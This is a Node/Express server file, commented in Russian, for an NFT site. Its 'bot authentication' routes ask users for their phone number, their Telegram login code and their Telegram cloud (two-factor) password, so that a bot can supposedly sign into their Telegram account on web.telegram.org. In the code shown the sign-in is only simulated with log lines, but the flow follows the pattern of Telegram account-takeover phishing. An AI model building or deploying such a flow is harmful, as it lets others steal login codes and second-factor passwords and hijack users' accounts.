import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import crypto from 'crypto';

dotenv.config();

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// Mock data for NFTs (остается без изменений)
const sampleNFTs = [
  // ... существующие NFT данные ...
];

// Хранилища
let users = [];
let authSessions = new Map();
let userSessions = new Map();
let botSessions = new Map(); // Сессии бота для автоматизации

// Генерация кода
function generateCode() {
  return Math.floor(10000 + Math.random() * 90000).toString();
}

// 🔐 НОВАЯ ЛОГИКА: Бот имитирует ввод на web.telegram.org
async function simulateWebTelegramAuth(phone, code, cloudPassword = null) {
  console.log(`🤖 [BOT SIMULATION] Starting auth for: ${phone}`);
  
  // Шаг 1: Бот вводит номер телефона на web.telegram.org
  console.log(`📱 [BOT] Entering phone number: ${phone}`);
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Шаг 2: Бот ожидает код от пользователя (который пришел в официальный Telegram)
  console.log(`📨 [BOT] Waiting for code from user...`);
  console.log(`🔑 [TELEGRAM OFFICIAL] Code sent to ${phone}: ${code}`);
  
  // Шаг 3: Бот вводит код на web.telegram.org
  console.log(`⌨️ [BOT] Entering code: ${code}`);
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Шаг 4: Если требуется облачный пароль
  if (cloudPassword) {
    console.log(`🔒 [BOT] Entering cloud password: ***`);
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  
  // Шаг 5: Бот успешно авторизован
  console.log(`✅ [BOT] Successfully authenticated as: ${phone}`);
  
  return {
    success: true,
    phone: phone,
    requiresCloudPassword: !!cloudPassword,
    message: 'Бот успешно вошел в аккаунт Telegram'
  };
}

// 🔄 НОВЫЕ МАРШРУТЫ ДЛЯ БОТ-АУТЕНТИФИКАЦИИ

// Шаг 1: Пользователь вводит номер телефона в бота
app.post('/api/bot-auth/start', async (req, res) => {
  try {
    const { phone } = req.body;
    
    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите номер телефона' 
      });
    }

    const phoneRegex = /^\+?[1-9]\d{1,14}$/;
    if (!phoneRegex.test(phone)) {
      return res.status(400).json({ 
        success: false, 
        error: 'Неверный формат номера телефона' 
      });
    }

    // Создаем сессию бота
    const sessionId = crypto.randomBytes(16).toString('hex');
    const authCode = generateCode();
    
    botSessions.set(sessionId, {
      phone: phone,
      code: authCode,
      step: 'waiting_code',
      attempts: 0,
      createdAt: Date.now(),
      requiresCloudPassword: false
    });

    console.log(`🤖 [BOT SESSION] Created session ${sessionId} for ${phone}`);
    console.log(`📨 [TELEGRAM] Code will be sent to official Telegram app: ${authCode}`);

    res.json({
      success: true,
      sessionId: sessionId,
      message: `🤖 Бот готов к авторизации. Код будет отправлен в ваш официальный Telegram`,
      instruction: 'Когда получите код в Telegram, введите его ниже',
      nextStep: 'enter_code',
      demoNote: `Демо-код: ${authCode}`
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Шаг 2: Пользователь вводит код из Telegram
app.post('/api/bot-auth/enter-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    
    if (!sessionId || !code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите код и sessionId' 
      });
    }

    const botSession = botSessions.get(sessionId);
    if (!botSession) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена. Начните заново.' 
      });
    }

    if (Date.now() - botSession.createdAt > 10 * 60 * 1000) {
      botSessions.delete(sessionId);
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия устарела. Начните заново.' 
      });
    }

    if (botSession.attempts >= 3) {
      botSessions.delete(sessionId);
      return res.status(400).json({ 
        success: false, 
        error: 'Слишком много попыток. Начните заново.' 
      });
    }

    // Проверяем код
    if (botSession.code !== code) {
      botSession.attempts++;
      botSessions.set(sessionId, botSession);
      
      const attemptsLeft = 3 - botSession.attempts;
      return res.status(400).json({ 
        success: false, 
        error: `Неверный код. Осталось попыток: ${attemptsLeft}` 
      });
    }

    // Код верный - бот имитирует ввод на web.telegram.org
    console.log(`🤖 [BOT] Starting web.telegram.org authentication...`);
    const authResult = await simulateWebTelegramAuth(botSession.phone, code);
    
    if (!authResult.success) {
      return res.status(400).json({ 
        success: false, 
        error: 'Ошибка авторизации в Telegram' 
      });
    }

    // Обновляем сессию
    botSession.step = 'waiting_cloud_password';
    botSession.requiresCloudPassword = true; // Предполагаем, что пароль нужен
    botSessions.set(sessionId, botSession);

    res.json({
      success: true,
      message: '✅ Код принят! Бот успешно ввел код в web.telegram.org',
      nextStep: 'cloud_password',
      instruction: 'Если у вас есть облачный пароль, введите его ниже'
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Шаг 3: Пользователь вводит облачный пароль (если требуется)
app.post('/api/bot-auth/enter-cloud-password', async (req, res) => {
  try {
    const { sessionId, cloudPassword } = req.body;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'SessionId обязателен' 
      });
    }

    const botSession = botSessions.get(sessionId);
    if (!botSession) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена' 
      });
    }

    // Бот вводит облачный пароль на web.telegram.org
    console.log(`🤖 [BOT] Entering cloud password on web.telegram.org...`);
    const finalAuth = await simulateWebTelegramAuth(
      botSession.phone, 
      botSession.code, 
      cloudPassword
    );

    if (!finalAuth.success) {
      return res.status(400).json({ 
        success: false, 
        error: 'Неверный облачный пароль' 
      });
    }

    // Создаем пользователя и сессию
    let user = users.find(u => u.phone === botSession.phone);
    const isNewUser = !user;
    
    if (!user) {
      user = {
        id: users.length + 1,
        phone: botSession.phone,
        telegramId: Math.floor(100000000 + Math.random() * 900000000),
        firstName: 'Telegram',
        lastName: 'User',
        username: `user${botSession.phone.replace('+', '')}`,
        isVerified: true,
        hasCloudPassword: !!cloudPassword,
        createdAt: new Date(),
        lastLogin: new Date(),
        authMethod: 'bot_automation'
      };
      users.push(user);
    } else {
      user.lastLogin = new Date();
      user.authMethod = 'bot_automation';
    }

    // Создаем пользовательскую сессию
    const userSessionId = crypto.randomBytes(32).toString('hex');
    userSessions.set(userSessionId, {
      userId: user.id,
      phone: user.phone,
      telegramId: user.telegramId,
      authMethod: 'bot_automation',
      expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000
    });

    // Очищаем сессию бота
    botSessions.delete(sessionId);

    console.log(`🎉 [SUCCESS] User ${botSession.phone} authenticated via bot`);

    res.json({
      success: true,
      message: '🎉 Бот успешно авторизовался в вашем аккаунте Telegram!',
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        username: user.username,
        hasCloudPassword: !!cloudPassword,
        authMethod: 'bot_automation'
      },
      sessionId: userSessionId,
      isNewUser: isNewUser
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Проверка статуса бот-сессии
app.get('/api/bot-auth/status', async (req, res) => {
  try {
    const { sessionId } = req.query;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'SessionId обязателен' 
      });
    }

    const botSession = botSessions.get(sessionId);
    if (!botSession) {
      return res.status(404).json({ 
        success: false, 
        error: 'Сессия не найдена' 
      });
    }

    res.json({
      success: true,
      session: {
        phone: botSession.phone,
        step: botSession.step,
        attempts: botSession.attempts,
        requiresCloudPassword: botSession.requiresCloudPassword,
        createdAt: botSession.createdAt
      }
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// ... остальные маршруты (NFT, проверка сессии, logout) остаются без изменений ...

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🤖 Bot authentication system ready`);
  console.log(`🏠 Main page: http://localhost:${PORT}/`);
});
